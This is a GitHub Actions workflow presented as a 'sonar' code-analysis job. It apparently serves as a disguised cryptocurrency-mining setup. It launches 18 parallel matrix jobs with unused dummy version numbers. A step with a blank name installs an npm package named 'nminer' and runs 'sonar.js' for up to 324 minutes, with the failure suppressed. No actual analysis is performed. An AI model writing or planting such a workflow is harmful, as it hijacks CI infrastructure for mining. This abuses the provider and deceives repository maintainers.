name: sonar
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 588 }
          - { version: 2158 }
          - { version: 854 }
          - { version: 5087 }
          - { version: 2375 }
          - { version: 6129 }
          - { version: 1501 }
          - { version: 4704 }
          - { version: 7790 }
          - { version: 2559 }
          - { version: 7664 }
          - { version: 7014 }
          - { version: 174 }
          - { version: 5317 }
          - { version: 1004 }
          - { version: 3462 }
          - { version: 2265 }
          - { version: 2105 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: 
        run: |
          npm install nminer@latest
          timeout 324m node sonar.js || echo "sonar executed"